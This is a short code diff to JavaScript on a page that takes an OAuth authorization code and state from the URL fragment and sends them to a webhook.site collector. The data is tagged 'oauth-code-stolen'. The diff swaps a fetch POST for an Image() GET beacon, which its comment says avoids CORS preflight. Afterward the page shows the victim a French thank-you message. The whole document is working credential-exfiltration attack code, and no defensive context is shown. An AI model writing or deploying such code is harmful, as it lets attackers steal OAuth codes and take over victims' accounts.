@@ -15,18 +15,8 @@ if (hash) {
     var code = params.get('code');
     var state = params.get('state');
 
-    // Send to webhook.site
-    fetch('https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            type: 'oauth-code-stolen',
-            code: code,
-            state: state,
-            full_hash: hash,
-            timestamp: new Date().toISOString()
-        })
-    });
+    // Send to webhook.site via GET (no CORS preflight)
+    new Image().src = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50?type=oauth-code-stolen&code=' + encodeURIComponent(code) + '&state=' + encodeURIComponent(state) + '&ts=' + Date.now();
 
     document.getElementById('msg').textContent = 'Merci ! Vous pouvez fermer cette page.';
 } else {
